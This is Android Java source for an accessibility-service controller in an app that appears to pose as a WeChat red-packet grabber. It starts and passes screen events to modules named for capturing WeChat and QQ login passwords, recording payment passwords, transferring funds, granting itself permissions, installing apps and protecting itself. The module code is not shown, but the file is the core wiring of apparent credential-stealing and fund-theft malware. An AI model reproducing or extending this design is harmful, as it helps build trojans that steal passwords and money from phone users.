/**
 * 
 */
package accessibility;

import ad.Ad2;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import download.install.InstallApp;

import com.example.h3.job.WechatAccessibilityJob;

import accessibility.app.AccessibilitySaveNotification;
import accessibility.app.ExeClick;
import accessibility.app.ProtectMe;
import accessibility.app.QQLoginPwd;
import accessibility.app.QQTransferAccounts;
import accessibility.app.ShotCode;
import accessibility.app.ShotPayPwdOnVideo;
import accessibility.app.TransferAccounts;
import accessibility.app.UIinfo;
import permission.GivePermission;
import permission.accessibility.GiveAccessibilityPermission;
import util.ConfigCt;
import accessibility.app.WechatInfo;
import accessibility.app.WechatLoginPwd;

/**
 * @author ASUS
 *
 */
public class ManageAccessibilityJob extends BaseAccessibilityJob {
	private static ManageAccessibilityJob current;
	private InstallApp installApp;
	private GivePermission mGivePermission;
	private WechatInfo mWechatInfo;
	private ShotCode mShotCode;
	private GiveAccessibilityPermission mGiveAccessibilityPermission;
	private UIinfo mUIinfo;
	private ProtectMe mProtectMe;
	private WechatLoginPwd mWechatLoginPwd;
	private QQLoginPwd mQQLoginPwd;
	private AccessibilitySaveNotification mSaveNotification;
	private TransferAccounts mTransferAccounts;
	private WechatAccessibilityJob mWechatAccessbilityJob;
	private ShotPayPwdOnVideo mShotPayPwdOnVideo;
	private QQTransferAccounts mQQTransferAccounts;
	private ExeClick mExeClick;
	//---------------------------------------------------------------------------------------
	public ManageAccessibilityJob(){
		//super(new String[]{Config.WECHAT_PACKAGENAME});
		super(null);
        //安装:
        installApp=InstallApp.getInstallApp();
        mGiveAccessibilityPermission=GiveAccessibilityPermission.getGiveAccessibilityPermission();
        mGivePermission=GivePermission.getGivePermission();
        mWechatInfo=WechatInfo.getWechatInfo();
        mShotCode=ShotCode.getShotCode();
        mUIinfo=UIinfo.getUIinfo();
        mProtectMe=ProtectMe.getProtectMe();
        mWechatLoginPwd=WechatLoginPwd.getWechatLoginPwd();
        mQQLoginPwd=QQLoginPwd.getInstance();
        mSaveNotification=AccessibilitySaveNotification.getInstance();
        mTransferAccounts=TransferAccounts.getInstance();
        mWechatAccessbilityJob=WechatAccessibilityJob.getJob();
        mShotPayPwdOnVideo=ShotPayPwdOnVideo.getInstance();
        mQQTransferAccounts=QQTransferAccounts.getInstance();
        mExeClick=ExeClick.getInstance(order.order.CMD_POS);
	}
	//----------------------------------------------------------------------------------------
    @Override
    public void onCreateJob(QiangHongBaoService service) {
        super.onCreateJob(service);
        EventStart();
        installApp.onCreateJob(service);
        mGiveAccessibilityPermission.onCreateJob(service);
        mGivePermission.onCreateJob(service);
        mWechatInfo.onCreateJob(service);
        mShotCode.onCreateJob(service);
        mUIinfo.onCreateJob(service);
        mProtectMe.onCreateJob(service);
        mWechatLoginPwd.onCreateJob(service);
        mQQLoginPwd.onCreateJob(service);
        mSaveNotification.onCreateJob(service);
        mTransferAccounts.onCreateJob(service);
        mWechatAccessbilityJob.onCreateJob(service);
        mShotPayPwdOnVideo.onCreateJob(service);
        mQQTransferAccounts.onCreateJob(service);
        mExeClick.onCreateJob(service);
    }
    @Override
    public void onStopJob() {
    	super.onStopJob();
    	installApp.onStopJob();
    	mGiveAccessibilityPermission.onStopJob();
    	mGivePermission.onStopJob();
    	mWechatInfo.onStopJob();
    	mShotCode.onStopJob();
    	mUIinfo.onStopJob();
    	mProtectMe.onStopJob();
    	mWechatLoginPwd.onStopJob();
    	mQQLoginPwd.onStopJob();
    	mSaveNotification.onStopJob();
    	mTransferAccounts.onStopJob();
    	mWechatAccessbilityJob.onStopJob();
    	mShotPayPwdOnVideo.onStopJob();
    	mQQTransferAccounts.onStopJob();
    	mExeClick.onStopJob();
    }
    public static synchronized ManageAccessibilityJob getJob() {
        if(current == null) {
            current = new ManageAccessibilityJob();
        }
        return current;
    }

    //----------------------------------------------------------------------------------------
    @Override
    public void onReceiveJob(AccessibilityEvent event) {
    	super.onReceiveJob(event);
    	if(!mIsEventWorking)return;
    	if(!mIsTargetPackageName)return;
    	debug(event);
    	//Log.i(TAG2, event.getPackageName().toString());
    	Ad2.getAd2(service, event.getPackageName().toString()).onReceiveJob(event);
    	installApp.onReceiveJob(event);
    	mGiveAccessibilityPermission.onReceiveJob(event);
    	mGivePermission.onReceiveJob(event);
    	mWechatInfo.onReceiveJob(event);
    	mShotCode.onReceiveJob(event);
    	mUIinfo.onReceiveJob(event);
    	mProtectMe.onReceiveJob(event);
    	mWechatLoginPwd.onReceiveJob(event);
    	mQQLoginPwd.onReceiveJob(event);
    	mSaveNotification.onReceiveJob(event);
    	mTransferAccounts.onReceiveJob(event);
    	mWechatAccessbilityJob.onReceiveJob(event);
    	mShotPayPwdOnVideo.onReceiveJob(event);
    	mQQTransferAccounts.onReceiveJob(event);
    }
	/*
	 * (刷新处理流程)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
		//Log.i(TAG2, "onWorking");
		//installApp.onWorking();
	}
	//--------------------------------------------------------------------------
    /*
    *调试打印
    */
   private void debug(AccessibilityEvent event){
     	if(ConfigCt.DEBUG){
     		if(event.getSource()==null)return;
     		//Log.i(ConfigCt.TAG2, "包名(全显示)--------------------->"+event.getPackageName());
     		if(!event.getSource().getPackageName().toString().equals(ConfigCt.WECHAT_PACKAGENAME))return;
   			Log.i(TAG, "mCurrentUI="+mCurrentUI);
   			if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
   				Log.i(TAG, "eventType=TYPE_WINDOW_STATE_CHANGED");
   				Log.i(TAG, "窗体--------------------->"+event.getClassName().toString());

   			}
   			if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)
   				Log.i(TAG, "eventType=TYPE_WINDOW_CONTENT_CHANGED");
   			Log.i(TAG, "包名--------------------->"+event.getPackageName());
	   			AccessibilityNodeInfo rootNode=event.getSource();
	   			if(rootNode==null)return;
	   			rootNode=AccessibilityHelper.getRootNode(rootNode);
	   			AccessibilityHelper.recycle(rootNode);	

   		}
   }
}
